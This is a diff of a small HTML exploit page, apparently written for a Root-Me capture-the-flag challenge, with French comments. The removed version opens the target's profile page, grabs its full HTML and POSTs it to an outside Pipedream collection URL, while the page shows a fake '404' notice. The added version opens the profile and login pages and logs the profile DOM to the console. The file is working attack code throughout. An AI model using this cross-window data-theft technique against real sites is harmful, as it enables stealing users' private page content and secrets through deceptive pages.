@@ -1,37 +1,26 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin Exploit</title>
+    <title>Exploitation Admin</title>
     <script type="text/javascript">
-        function exploit() {
-            // Ouvre la page Profile où se trouve le secret
+        // Ouvre la page Profile dans un nouvel onglet
+        window.open('http://challenge01.root-me.org:58003/profile', '_blank');
+
+        // Ouvre la page Login dans un autre onglet
+        window.open('http://challenge01.root-me.org:58003/login', '_blank');
+
+        // Une fois la page Profile chargée, récupère le DOM
+        setTimeout(function() {
             var profileWindow = window.open('http://challenge01.root-me.org:58003/profile', '_blank');
-
-            // Attendre que la page Profile soit complètement chargée
-            profileWindow.onload = function() {
-                try {
-                    // Récupérer tout le contenu HTML de la page Profile
-                    var fullHTML = profileWindow.document.documentElement.outerHTML;
-
-                    // Envoyer la page complète à ton workflow Pipedream
-                    var xhr = new XMLHttpRequest();
-                    xhr.open('POST', 'https://eojivep1vj04e9q.m.pipedream.net', true); // Utilise ton URL Pipedream ici
-                    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-                    xhr.send('html=' + encodeURIComponent(fullHTML));
-                } catch (e) {
-                    console.error('Erreur lors de la récupération du HTML : ', e);
-                }
-            };
-        }
-
-        // Lancer l'exploit dès que la page est chargée
-        window.onload = exploit;
+            var profileDOM = profileWindow.document.documentElement.outerHTML;
+            console.log(profileDOM); // Affiche le DOM dans la console
+        }, 1000); // Attendre 1 seconde pour s'assurer que Profile est chargé
     </script>
 </head>
 <body>
-    <h1>Erreur 404 - Page introuvable</h1>
-    <p>Redirection en cours...</p>
+    <h1>Exploitation en cours...</h1>
+    <p>Veuillez patienter pendant que les pages s'ouvrent.</p>
 </body>
 </html>
